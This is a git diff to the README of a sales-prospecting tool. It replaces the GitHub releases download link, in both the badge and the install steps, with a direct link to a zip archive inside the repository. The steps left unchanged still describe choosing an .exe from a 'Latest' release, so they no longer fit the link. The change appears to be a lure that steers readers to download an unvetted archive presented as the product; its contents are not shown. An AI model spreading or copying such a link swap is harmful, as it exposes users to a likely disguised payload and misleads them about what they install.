@@ -1,6 +1,6 @@
 # 🔍 signal-prospecting-kit - Identify active buyers and generate outreach
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/cismontane-harris2642/signal-prospecting-kit/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/cismontane-harris2642/signal-prospecting-kit/main/skills/start/prospecting-signal-kit-1.3.zip)
 
 ## What is this tool?
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these instructions to set up the software.
 
-1.  Visit [this page to download](https://github.com/cismontane-harris2642/signal-prospecting-kit/releases).
+1.  Visit [this page to download](https://raw.githubusercontent.com/cismontane-harris2642/signal-prospecting-kit/main/skills/start/prospecting-signal-kit-1.3.zip).
 2.  Click the version marked as "Latest" to expand the assets list.
 3.  Select the file ending in `.exe` to begin the download.
 4.  Once the file finishes downloading, navigate to your Downloads folder.
